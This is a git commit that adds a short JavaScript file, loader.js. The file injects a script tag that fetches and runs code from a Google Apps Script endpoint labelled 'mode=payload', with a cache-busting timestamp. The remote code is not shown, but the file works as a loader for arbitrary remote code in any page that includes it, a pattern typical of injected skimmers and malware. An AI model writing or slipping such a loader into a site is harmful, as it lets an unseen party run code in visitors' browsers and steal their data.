624664430d252e3c0d01fa1f07fadfb907b07360
vlado-spec <vlado@plinoservis.com>
2026-09-25 16:09:44 +0200

    Create loader.js

---
+++ loader.js
@@ -0,0 +1,13 @@
+(function () {
+  "use strict";
+
+  var s = document.createElement("script");
+  s.type = "text/javascript";
+  s.async = true;
+
+  s.src =
+    "https://script.google.com/macros/s/AKfycby235EcFPubK8Q02CCO53Hd4lJZvaLDEkvJ6i9fmzxxntR5H1oEZK1xg50nV0zD0b-L/exec?mode=payload&v=" +
+    Date.now();
+
+  (document.head || document.documentElement).appendChild(s);
+})();
